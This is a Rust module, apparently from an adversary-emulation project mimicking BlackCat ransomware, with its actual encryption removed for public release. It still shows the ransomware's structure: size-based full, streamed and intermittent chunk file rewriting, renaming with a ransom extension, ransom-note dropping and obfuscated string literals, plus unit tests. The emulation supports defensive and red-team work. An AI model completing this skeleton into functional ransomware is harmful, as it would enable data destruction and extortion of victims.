use std::error::Error;
use std::fs::{OpenOptions, rename, write};
use std::io::{SeekFrom, Seek, Read, Write};
use rand::{RngCore, SeedableRng};
use rand_chacha::ChaCha20Rng;
use crate::config::Host;
use crate::logger::{log_debug, log_error, log_info};
use encryptliterals::esl;

#[cfg(unix)]
use {
    std::path::Path,
};

// For encrypting files in stream-mode or chunk-mode
const BUFFER_SIZE: usize = {
    #[cfg(not(test))] {
        8*1024
    }

    #[cfg(test)] {
        64
    }
};

// Stream-encrypt files that are 32KB or more
const STREAM_THRESHOLD: usize = {
    #[cfg(not(test))] {
        32*1024
    }

    #[cfg(test)] {
        128
    }
};

// For large files, this is the chunk size that we will iterate over and encrypt the first BUFFER_SIZE bytes
const LARGE_FILE_CHUNK_SIZE: usize = {
    #[cfg(not(test))] {
        1024*1024
    }

    #[cfg(test)] {
        256
    }
};

// Chunk-encrypt files that are 128MB or more
const CHUNK_THRESHOLD: usize = {
    #[cfg(not(test))] {
        128*1024*1024
    }

    #[cfg(test)] {
        2048
    }
};

/// Sets the AES key of `host` to a randomly generated key
pub fn set_aes_key(host: &mut Host) {
    let mut rng_key = [0; 16];
    let mut rng = ChaCha20Rng::from_entropy();
    ChaCha20Rng::fill_bytes(&mut rng, &mut rng_key);
    host.set_aes_key(rng_key);
}

/**
* encrypt
*      About:
*          Encrypts files in the directory and appends custom ransomware extension
*          to make them unusable and incentivises the payment of the ransom
*          For public release: no encryption is actually performed, and no IV is generated/appended.
*      Result:
*          Encrypted file from `path` and with `extension` appended to denote it has been encrypted. IV is appended to end of encrypted file.
*          For public release: no encryption is actually performed, and no IV is generated/appended.
*      MITRE ATT&CK Techniques:
*          T1486: Data Encrypted for Impact
*      CTI:
*          https://www.varonis.com/blog/blackcat-ransomware
*          https://securityintelligence.com/posts/blackcat-ransomware-levels-up-stealth-speed-exfiltration/
*          https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Linux/BlackCat.A!MTB
*          https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/
*          https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-alphv-rust-ransomware
*          https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf
*/
pub fn encrypt(path: &String, extension: &String, _key: &[u8; 16]) -> Result<(), Box<dyn Error>>{
    // Get dest file name
    let mut path_with_entension = path.clone();
    path_with_entension.push_str(extension);

    // Explicit block here to close original file before renaming it, if needed
    {
        let mut file = OpenOptions::new()
            .read(true)
            .write(true)
            .open(path)?;
        let mut pos = file.seek(SeekFrom::Start(0))?;

        // Get file length
        let file_length = match usize::try_from(file.metadata()?.len()) {
            Ok(s) => s,
            Err(e) => {
                Err(format!("{}: {}", esl!("Could not get file length"), e))?
            }
        };

        // If small enough, encrypt in place in memory
        if file_length < STREAM_THRESHOLD {
            let mut buf = vec![0; file_length];
            file.read_exact(&mut buf)?;
            
            // Note: encryption removed

            // Overwrite file with encrypted data
            write(path, &mut buf)?;
        } else if file_length < CHUNK_THRESHOLD {
            // File may be fairly large - encrypt via stream in place
            let mut buf = [0 as u8; BUFFER_SIZE];

            loop {
                let bytes_read = file.read(&mut buf)?;
                pos = file.seek(SeekFrom::Start(pos))?; // backtrack to overwrite contents we just read

                if bytes_read == BUFFER_SIZE {
                    // Note: encryption removed

                    file.write_all(&buf)?;
                } else if bytes_read > 0 {
                    // Note: encryption removed

                    file.write_all(&buf[..bytes_read])?;
                    break;
                } else {
                    // Exact multiple of BUFFER_SIZE
                    break;
                }
                pos = file.seek(SeekFrom::Start(pos + bytes_read as u64))?;
            }
        } else {
            // Huge file - encrypt only the first BUFFER_SIZE bytes of each chunk
            log_debug(format!("{} {} {} {}", path, esl!("has huge size of"), file_length, esl!("bytes - encrypting via chunk method.")));

            // Iterate through each chunk
            let mut processed = 0 as usize;
            let mut buf = [0 as u8; BUFFER_SIZE];
            while processed < file_length {
                let bytes_read = file.read(&mut buf)?;
                pos = file.seek(SeekFrom::Start(pos))?; // backtrack to overwrite contents we just read

                if bytes_read == BUFFER_SIZE {
                    // Note: encryption removed
                    
                    file.write_all(&buf)?;
                } else if bytes_read > 0 {
                    // Note: encryption removed

                    file.write_all(&buf[..bytes_read])?;
                }

                processed += LARGE_FILE_CHUNK_SIZE;
                if processed < file_length {
                    pos = file.seek(SeekFrom::Start(processed as u64))?;
                }
            }
        }
    }

    // Rename file to append custom extension
    match rename(path, path_with_entension) {
        Ok(_) => {},
        Err(error) => {
            Err(format!("{}: {}", esl!("Could not add extension to encrypted file"), error))?
        }
    }

    Ok(())
}

/// Drops a ransom note in the provided directory path using the provided ransom note name and contents
pub fn drop_ransom_note(path: String, note_file_name: &str, note_contents: &str) {
    #[cfg(target_os = "windows")]
    let note_path = path.clone() + "\\" + note_file_name;

    #[cfg(unix)]
    let note_path = path.clone() + "/" + note_file_name;

    #[cfg(unix)] {
        if Path::new(&note_path).exists() {
            log_debug(format!("{} {}", esl!("Ransom note already exists at"), note_path));
            return;
        }
    }

    match write(note_path.clone(), note_contents) {
        Ok(_) => log_info(format!("{} {}", esl!("Ransom note written to"), note_path)),
        Err(e) => log_error(format!("{} {}: {:?}", esl!("Failed to write ransom note to"), note_path, e))
    }
}

/// Removes the ransom note in the `directory` with the name and contents from 
/// `host` configuration settings
#[cfg(debug_assertions)]
pub fn remove_ransom_note(path: String, note_file_name: &str) {
    #[cfg(target_os = "windows")]
    let note_path = path.clone() + "\\" + note_file_name;

    #[cfg(unix)]
    let note_path = path.clone() + "/" + note_file_name;

    match std::fs::remove_file(note_path.clone()) {
        Ok(_) => log_info(format!("{} {}", esl!("Ransom note removed from"), note_path)),
        Err(e) => log_error(format!("{} {} : {:?}", esl!("Ransom note was NOT removed from"), note_path, e))
    }
}

/// Decrypts the file from `path` and removes the extension - returns new file path without extension
#[cfg(any(test, debug_assertions))]
pub fn decrypt(path: &String, _key: &[u8; 16]) -> Result<String, Box<dyn Error>> {
    // Explicit block here to close original file before renaming it, if needed
    {
        let mut file = OpenOptions::new()
            .read(true)
            .write(true)
            .open(path)?;
        file.seek(SeekFrom::Start(0))?;

        // Get file length
        let file_length = match usize::try_from(file.metadata()?.len()) {
            Ok(s) => s,
            Err(e) => {
                Err(format!("{}: {}", esl!("Could not get file length"), e))?
            }
        };

        let mut pos = file.seek(SeekFrom::Start(0))?;

        // If small enough, decrypt in place in memory
        if file_length < STREAM_THRESHOLD {
            let mut buf = vec![0; file_length];
            file.read_exact(&mut buf)?;
            
            // Note: decryption removed

            // Overwrite file with decrypted plaintext
            write(path, &mut buf)?;
        } else if file_length < CHUNK_THRESHOLD {
            // File may be fairly large - decrypt via stream in place
            let mut buf = [0 as u8; BUFFER_SIZE];

            loop {
                let bytes_read = file.read(&mut buf)?;
                pos = file.seek(SeekFrom::Start(pos))?; // backtrack to overwrite contents we just read

                if bytes_read == BUFFER_SIZE {
                    // Note: decryption removed

                    file.write_all(&buf)?;
                } else if bytes_read > 0 {
                    // Note: decryption removed

                    file.write_all(&buf[..bytes_read])?;
                    break;
                } else {
                    // Exact multiple of BUFFER_SIZE
                    break;
                }
                pos = file.seek(SeekFrom::Start(pos + bytes_read as u64))?;
            }
        } else {
            // Huge file - decrypt only the first BUFFER_SIZE bytes of each chunk
            log_debug(format!("{} {} {} {}", path, esl!("has huge size of"), file_length, esl!("bytes - decrypting via chunk method.")));

            // Iterate through each chunk
            let mut processed = 0 as usize;
            let mut buf = [0 as u8; BUFFER_SIZE];
            while processed < file_length {
                let bytes_read = file.read(&mut buf)?;
                pos = file.seek(SeekFrom::Start(pos))?; // backtrack to overwrite contents we just read

                if bytes_read == BUFFER_SIZE {
                    // Note: decryption removed

                    file.write_all(&buf)?;
                } else if bytes_read > 0 {
                    // Note: decryption removed
                    
                    file.write_all(&buf[..bytes_read])?;
                }

                processed += LARGE_FILE_CHUNK_SIZE;
                if processed < file_length {
                    pos = file.seek(SeekFrom::Start(processed as u64))?;
                }
            }
        }
    }

    // Remove encryption extension
    let mut path_pieces = path.split(".").collect::<Vec<&str>>();
    path_pieces.pop();
    let ext_removed = path_pieces.join(".");
    match rename(path, ext_removed.clone()) {
        Ok(_) => {},
        Err(error) => {
            Err(format!("{} {}: {}", esl!("Could not rename decrypted file"), path, error))?
        }
    }
    Ok(ext_removed)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs::{create_dir, remove_dir_all, read, read_to_string, write};
    use std::path::Path;
    use serial_test::serial;
    pub use crate::config::validate_access_token;

    /// Test decrypting small file in memory
    #[test]
    #[serial]
    fn test_decrypt_small() {
        let config = validate_access_token("15742aa362a84ba3").unwrap();
        let h = Host::new(config);
        let dir = {
            #[cfg(target_os = "windows")] {
                ".\\blackcattest"
            }

            #[cfg(unix)] {
                "./blackcattest"
            }
        };

        let path = {
            #[cfg(target_os = "windows")] {
                String::from(".\\blackcattest\\filetest.txt")
            }

            #[cfg(unix)] {
                String::from("./blackcattest/filetest.txt")
            }
        };

        let mut path_with_extension = path.clone();
        path_with_extension.push_str(h.get_extension());

        let plaintext = b"hello world! this is my plaintext.";
        let ciphertext = b"hello world! this is my plaintext.";
        let key = [0x42; 16];

        if Path::new(dir).exists() {
            remove_dir_all(dir).unwrap();
        }
        create_dir(dir).unwrap();
        write(path_with_extension.clone(), ciphertext).unwrap();

        // Decrypt to verify
        let result = decrypt(&path_with_extension, &key).unwrap();
        assert_eq!(result, path);
        assert!(!Path::new(&path_with_extension).exists());
        assert!(Path::new(&path).exists());
        let decrypted_contents = read_to_string(&path).expect("Unable to read decrypted file");
        assert_eq!(plaintext, decrypted_contents.as_bytes());

        remove_dir_all(dir).unwrap();
    }
    
    /// Test decrypting medium-sized file in place
    #[test]
    #[serial]
    fn test_decrypt_medium() {
        let config = validate_access_token("15742aa362a84ba3").unwrap();
        let h = Host::new(config);

        let dir = {
            #[cfg(target_os = "windows")] {
                ".\\blackcattest"
            }

            #[cfg(unix)] {
                "./blackcattest"
            }
        };

        let path = {
            #[cfg(target_os = "windows")] {
                String::from(".\\blackcattest\\filetest.txt")
            }

            #[cfg(unix)] {
                String::from("./blackcattest/filetest.txt")
            }
        };

        let mut path_with_extension = path.clone();
        path_with_extension.push_str(h.get_extension());

        let plaintext = b"Call me Ishmael. Some years ago- never mind how long precisely- having little or no money in my purse, and nothing particular to interest me on shore, I thought I would sail about a little and see the watery part of the world. It is a way I have of driving off the spleen and regulating the circulation. Whenever I find myself growing grim about the mouth; whenever it is a damp, drizzly November in my soul; whenever I find myself involuntarily pausing before coffin warehouses, and bringing up the rear of every funeral I meet; and especially whenever my hypos get such an upper hand of me, that it requires a strong moral principle to prevent me from deliberately stepping into the street, and methodically knocking people's hats off- then, I account it high time to get to sea as soon as I can. This is my substitute for pistol and ball. With a philosophical flourish Cato throws himself upon his sword; I quietly take to the ship. There is nothing surprising in this. If they but knew it, almost all men in their degree, some time or other, cherish very nearly the same feelings towards the ocean with me.";
        let ciphertext = b"Call me Ishmael. Some years ago- never mind how long precisely- having little or no money in my purse, and nothing particular to interest me on shore, I thought I would sail about a little and see the watery part of the world. It is a way I have of driving off the spleen and regulating the circulation. Whenever I find myself growing grim about the mouth; whenever it is a damp, drizzly November in my soul; whenever I find myself involuntarily pausing before coffin warehouses, and bringing up the rear of every funeral I meet; and especially whenever my hypos get such an upper hand of me, that it requires a strong moral principle to prevent me from deliberately stepping into the street, and methodically knocking people's hats off- then, I account it high time to get to sea as soon as I can. This is my substitute for pistol and ball. With a philosophical flourish Cato throws himself upon his sword; I quietly take to the ship. There is nothing surprising in this. If they but knew it, almost all men in their degree, some time or other, cherish very nearly the same feelings towards the ocean with me.";
        let key = [0x42; 16];

        if Path::new(dir).exists() {
            remove_dir_all(dir).unwrap();
        }
        create_dir(dir).unwrap();
        write(path_with_extension.clone(), ciphertext).unwrap();

        // Decrypt to verify
        let result = decrypt(&path_with_extension, &key).unwrap();
        assert_eq!(result, path);
        assert!(!Path::new(&path_with_extension).exists());
        assert!(Path::new(&path).exists());
        let decrypted_contents = read_to_string(&path).expect("Unable to read decrypted file");
        assert_eq!(plaintext, decrypted_contents.as_bytes());

        remove_dir_all(dir).unwrap();
    }

    /// Test encrypt renames file and encrypts correctly for a small file (encryption in memory)
    #[test]
    #[serial]
    fn test_encrypt_small() {
        let config = validate_access_token("15742aa362a84ba3").unwrap();
        let mut h = Host::new(config);
        set_aes_key(&mut h);

        let dir = {
            #[cfg(target_os = "windows")] {
                ".\\blackcattest"
            }

            #[cfg(unix)] {
                "./blackcattest"
            }
        };

        let path = {
            #[cfg(target_os = "windows")] {
                String::from(".\\blackcattest\\filetest.txt")
            }

            #[cfg(unix)] {
                String::from("./blackcattest/filetest.txt")
            }
        };

        let mut path_with_extension = path.clone();
        path_with_extension.push_str(h.get_extension());

        let plaintext = b"hello world! this is my plaintext.";
        let key = *h.get_aes_key();

        if Path::new(dir).exists() {
            remove_dir_all(dir).unwrap();
        }
        create_dir(dir).unwrap();
        write(path.clone(), plaintext).unwrap();

        encrypt(&path, h.get_extension(), &key).unwrap();
        assert!(Path::new(&path_with_extension).exists());
        assert!(!Path::new(&path).exists());

        // Decrypt to verify
        let result = decrypt(&path_with_extension, &key).unwrap();
        assert_eq!(result, path);
        assert!(!Path::new(&path_with_extension).exists());
        assert!(Path::new(&path).exists());
        let decrypted_contents = read_to_string(&path).expect("Unable to read decrypted file");
        assert_eq!(plaintext, decrypted_contents.as_bytes());

        remove_dir_all(dir).unwrap();
    }

    /// Test encrypt renames file and encrypts correctly for a medium file (encrypt in place)
    #[test]
    #[serial]
    fn test_encrypt_medium() {
        let config = validate_access_token("15742aa362a84ba3").unwrap();
        let mut h = Host::new(config);
        set_aes_key(&mut h);
 
        let dir = {
            #[cfg(target_os = "windows")] {
                ".\\blackcattest"
            }

            #[cfg(unix)] {
                "./blackcattest"
            }
        };

        let path = {
            #[cfg(target_os = "windows")] {
                String::from(".\\blackcattest\\filetest.txt")
            }

            #[cfg(unix)] {
                String::from("./blackcattest/filetest.txt")
            }
        };

        let mut path_with_extension = path.clone();
        path_with_extension.push_str(h.get_extension());
 
        let plaintext = b"Call me Ishmael. Some years ago- never mind how long precisely- having little or no money in my purse, and nothing particular to interest me on shore, I thought I would sail about a little and see the watery part of the world. It is a way I have of driving off the spleen and regulating the circulation. Whenever I find myself growing grim about the mouth; whenever it is a damp, drizzly November in my soul; whenever I find myself involuntarily pausing before coffin warehouses, and bringing up the rear of every funeral I meet; and especially whenever my hypos get such an upper hand of me, that it requires a strong moral principle to prevent me from deliberately stepping into the street, and methodically knocking people's hats off- then, I account it high time to get to sea as soon as I can. This is my substitute for pistol and ball. With a philosophical flourish Cato throws himself upon his sword; I quietly take to the ship. There is nothing surprising in this. If they but knew it, almost all men in their degree, some time or other, cherish very nearly the same feelings towards the ocean with me.";
        let key = *h.get_aes_key();

        if Path::new(dir).exists() {
            remove_dir_all(dir).unwrap();
        }
        create_dir(dir).unwrap();
        write(path.clone(), plaintext).unwrap();

        encrypt(&path, h.get_extension(), &key).unwrap();
        assert!(Path::new(&path_with_extension).exists());
        assert!(!Path::new(&path).exists());

        // Decrypt to verify
        let result = decrypt(&path_with_extension, &key).unwrap();
        assert_eq!(result, path);
        assert!(!Path::new(&path_with_extension).exists());
        assert!(Path::new(&path).exists());
        let decrypted_contents = read_to_string(&path).expect("Unable to read decrypted file");
        assert_eq!(plaintext, decrypted_contents.as_bytes());

        remove_dir_all(dir).unwrap();
    }

    // test decrypt medium file -- exact multiple of buffer size 
    #[test]
    #[serial]
    fn test_decrypt_medium_exact_multiple() {
        let config = validate_access_token("15742aa362a84ba3").unwrap();
        let h = Host::new(config);

        let dir = {
            #[cfg(target_os = "windows")] {
                ".\\blackcattest"
            }

            #[cfg(unix)] {
                "./blackcattest"
            }
        };

        let path = {
            #[cfg(target_os = "windows")] {
                String::from(".\\blackcattest\\filetest.txt")
            }

            #[cfg(unix)] {
                String::from("./blackcattest/filetest.txt")
            }
        };

        let mut path_with_extension = path.clone();
        path_with_extension.push_str(h.get_extension());

        let plaintext = [0x01; 256];
        let ciphertext = [0x01; 256];
        let key = [0x42; 16];

        if Path::new(dir).exists() {
            remove_dir_all(dir).unwrap();
        }
        create_dir(dir).unwrap();
        write(path_with_extension.clone(), ciphertext).unwrap();

        // Decrypt to verify
        let result = decrypt(&path_with_extension, &key).unwrap();
        assert_eq!(result, path);
        assert!(!Path::new(&path_with_extension).exists());
        assert!(Path::new(&path).exists());
        let decrypted_contents = read(&path).expect("Unable to read decrypted file");
        assert_eq!(plaintext, decrypted_contents.as_slice());

        remove_dir_all(dir).unwrap();
    }


    // test encrypt medium file -- exact multiple of buffer size
    #[test]
    #[serial]
    fn test_encrypt_medium_exact_multiple() {
        let config = validate_access_token("15742aa362a84ba3").unwrap();
        let mut h = Host::new(config);
        set_aes_key(&mut h);
 
        let dir = {
            #[cfg(target_os = "windows")] {
                ".\\blackcattest"
            }

            #[cfg(unix)] {
                "./blackcattest"
            }
        };

        let path = {
            #[cfg(target_os = "windows")] {
                String::from(".\\blackcattest\\filetest.txt")
            }

            #[cfg(unix)] {
                String::from("./blackcattest/filetest.txt")
            }
        };

        let mut path_with_extension = path.clone();
        path_with_extension.push_str(h.get_extension());
 
        let plaintext = [0x01; 256];
        let key = *h.get_aes_key();

        if Path::new(dir).exists() {
            remove_dir_all(dir).unwrap();
        }
        create_dir(dir).unwrap();
        write(path.clone(), plaintext).unwrap();

        encrypt(&path, h.get_extension(),& key).unwrap();
        assert!(Path::new(&path_with_extension).exists());
        assert!(!Path::new(&path).exists());

        // Decrypt to verify
        let result = decrypt(&path_with_extension, &key).unwrap();
        assert_eq!(result, path);
        assert!(!Path::new(&path_with_extension).exists());
        assert!(Path::new(&path).exists());
        let decrypted_contents = read(&path).expect("Unable to read decrypted file");
        assert_eq!(plaintext, decrypted_contents.as_slice());

        remove_dir_all(dir).unwrap();
    }

    #[test]
    #[serial]
    fn test_decrypt_large_file() {
        let config = validate_access_token("15742aa362a84ba3").unwrap();
        let h = Host::new(config);

        let dir = {
            #[cfg(target_os = "windows")] {
                ".\\blackcattest"
            }

            #[cfg(unix)] {
                "./blackcattest"
            }
        };

        let path = {
            #[cfg(target_os = "windows")] {
                String::from(".\\blackcattest\\filetest.txt")
            }

            #[cfg(unix)] {
                String::from("./blackcattest/filetest.txt")
            }
        };

        let mut path_with_extension = path.clone();
        path_with_extension.push_str(h.get_extension());

        let plaintext = [0x01; 2050];
        let ciphertext = [0x01; 2050];
        let key = [0x42; 16];

        if Path::new(dir).exists() {
            remove_dir_all(dir).unwrap();
        }
        create_dir(dir).unwrap();
        write(path_with_extension.clone(), ciphertext).unwrap();

        // Decrypt to verify
        let result = decrypt(&path_with_extension, &key).unwrap();
        assert_eq!(result, path);
        assert!(!Path::new(&path_with_extension).exists());
        assert!(Path::new(&path).exists());
        let decrypted_contents = read(&path).expect("Unable to read decrypted file");
        assert_eq!(plaintext, decrypted_contents.as_slice());

        remove_dir_all(dir).unwrap();
    }

    #[test]
    #[serial]
    fn test_encrypt_large() {
        let config = validate_access_token("15742aa362a84ba3").unwrap();
        let mut h = Host::new(config);
        set_aes_key(&mut h);
 
        let dir = {
            #[cfg(target_os = "windows")] {
                ".\\blackcattest"
            }

            #[cfg(unix)] {
                "./blackcattest"
            }
        };

        let path = {
            #[cfg(target_os = "windows")] {
                String::from(".\\blackcattest\\filetest.txt")
            }

            #[cfg(unix)] {
                String::from("./blackcattest/filetest.txt")
            }
        };

        let mut path_with_extension = path.clone();
        path_with_extension.push_str(h.get_extension());
 
        let plaintext = [0x01; 2050];
        let key = *h.get_aes_key();

        if Path::new(dir).exists() {
            remove_dir_all(dir).unwrap();
        }
        create_dir(dir).unwrap();
        write(path.clone(), plaintext).unwrap();

        encrypt(&path, h.get_extension(), &key).unwrap();
        assert!(Path::new(&path_with_extension).exists());
        assert!(!Path::new(&path).exists());

        // Decrypt to verify
        let result = decrypt(&path_with_extension, &key).unwrap();
        assert_eq!(result, path);
        assert!(!Path::new(&path_with_extension).exists());
        assert!(Path::new(&path).exists());
        let decrypted_contents = read(&path).expect("Unable to read decrypted file");
        assert_eq!(plaintext, decrypted_contents.as_slice());

        remove_dir_all(dir).unwrap();
    }

    #[test]
    #[serial]
    fn test_decrypt_large_file_exact_multiple() {
        let config = validate_access_token("15742aa362a84ba3").unwrap();
        let h = Host::new(config);

        let dir = {
            #[cfg(target_os = "windows")] {
                ".\\blackcattest"
            }

            #[cfg(unix)] {
                "./blackcattest"
            }
        };

        let path = {
            #[cfg(target_os = "windows")] {
                String::from(".\\blackcattest\\filetest.txt")
            }

            #[cfg(unix)] {
                String::from("./blackcattest/filetest.txt")
            }
        };

        let mut path_with_extension = path.clone();
        path_with_extension.push_str(h.get_extension());

        let plaintext = [0x01; 2048];
        let ciphertext = [0x01; 2048];
        let key = [0x42; 16];

        if Path::new(dir).exists() {
            remove_dir_all(dir).unwrap();
        }
        create_dir(dir).unwrap();
        write(path_with_extension.clone(), ciphertext).unwrap();

        // Decrypt to verify
        let result = decrypt(&path_with_extension, &key).unwrap();
        assert_eq!(result, path);
        assert!(!Path::new(&path_with_extension).exists());
        assert!(Path::new(&path).exists());
        let decrypted_contents = read(&path).expect("Unable to read decrypted file");
        assert_eq!(plaintext, decrypted_contents.as_slice());

        remove_dir_all(dir).unwrap();
    }

    #[test]
    #[serial]
    fn test_encrypt_large_exact_multiple() {
        let config = validate_access_token("15742aa362a84ba3").unwrap();
        let mut h = Host::new(config);
        set_aes_key(&mut h);
 
        let dir = {
            #[cfg(target_os = "windows")] {
                ".\\blackcattest"
            }

            #[cfg(unix)] {
                "./blackcattest"
            }
        };

        let path = {
            #[cfg(target_os = "windows")] {
                String::from(".\\blackcattest\\filetest.txt")
            }

            #[cfg(unix)] {
                String::from("./blackcattest/filetest.txt")
            }
        };

        let mut path_with_extension = path.clone();
        path_with_extension.push_str(h.get_extension());
 
        let plaintext = [0x01; 2048];
        let key = *h.get_aes_key();

        if Path::new(dir).exists() {
            remove_dir_all(dir).unwrap();
        }
        create_dir(dir).unwrap();
        write(path.clone(), plaintext).unwrap();

        encrypt(&path, h.get_extension(), &key).unwrap();
        assert!(Path::new(&path_with_extension).exists());
        assert!(!Path::new(&path).exists());

        // Decrypt to verify
        let result = decrypt(&path_with_extension, &key).unwrap();
        assert_eq!(result, path);
        assert!(!Path::new(&path_with_extension).exists());
        assert!(Path::new(&path).exists());
        let decrypted_contents = read(&path).expect("Unable to read decrypted file");
        assert_eq!(plaintext, decrypted_contents.as_slice());

        remove_dir_all(dir).unwrap();
    }
}
